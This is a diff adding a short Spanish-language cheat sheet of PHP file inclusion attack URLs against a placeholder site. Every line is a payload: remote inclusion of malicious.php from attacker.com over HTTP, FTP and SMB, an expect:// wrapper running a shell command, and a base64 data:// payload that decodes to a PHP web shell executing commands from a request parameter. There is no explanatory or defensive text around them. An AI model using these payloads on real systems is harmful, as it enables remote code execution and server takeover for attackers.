@@ -1,0 +1,14 @@
+▶ Inclusión de Archivo Remoto (Ejecutar script remoto):
+  http://ejemplo.com/index.php?page=http://attacker.com/malicious.php
+
+▶ Ejecución de Código Remoto (Inyectar código Base64):
+  http://ejemplo.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+
+▶ Uso de Wrappers (Ejecutar comandos con expect):
+  http://ejemplo.com/index.php?page=expect://ls
+
+▶ Inclusión desde FTP (Cargar desde servidor FTP):
+  http://ejemplo.com/index.php?page=ftp://attacker.com/malicious.php
+
+▶ Inclusión desde SMB (Cargar desde recurso compartido):
+  http://ejemplo.com/index.php?page=\\attacker.com\share\malicious.php
